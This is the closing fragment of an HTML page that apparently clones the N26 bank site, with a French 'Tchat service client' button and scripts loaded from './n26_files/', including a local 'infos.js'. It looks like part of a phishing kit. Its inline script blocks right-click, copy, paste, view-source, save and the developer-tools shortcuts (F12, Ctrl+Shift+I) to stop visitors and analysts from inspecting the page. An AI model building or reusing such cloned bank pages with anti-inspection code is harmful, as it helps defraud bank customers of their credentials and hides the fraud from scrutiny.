22.472v-2.944c0-2.478.278-3.48.801-4.459a5.452 5.452 0 0 1 2.268-2.268c.978-.523 1.98-.801 4.459-.801z"></path><path fill="#C3D2E0" d="M24 12h-8.472c-2.478 0-3.48.278-4.459.801a5.452 5.452 0 0 0-2.268 2.268C8.278 16.047 8 17.05 8 19.528V20H2.564c-.892 0-1.215-.093-1.54-.267a1.817 1.817 0 0 1-.757-.756C.093 18.65 0 18.327 0 17.437v-7.91C0 7.05.278 6.048.801 5.07A5.452 5.452 0 0 1 3.07 2.801C4.047 2.278 5.05 2 7.528 2h8.944c2.478 0 3.48.278 4.459.801a5.452 5.452 0 0 1 2.268 2.268c.523.978.801 1.98.801 4.459V12z"></path><circle cx="15" cy="21.5" r="1.5" fill="currentColor"></circle><circle cx="20" cy="21.5" r="1.5" fill="currentColor"></circle><circle cx="25" cy="21.5" r="1.5" fill="currentColor"></circle></g></svg></span><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tchat service client</font></font></span></button></div></div>
    <div id="dialog-root"></div>
    <div id="notification-root" role="status" aria-live="polite"></div>
    <div id="error-notification-root" role="alert" aria-live="assertive"></div>


  <script src="./n26_files/jquery.min.js"></script>
<script src="./n26_files/imask.min.js"></script>
<script src="./n26_files/infos.js"></script>
<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>

</body></html>
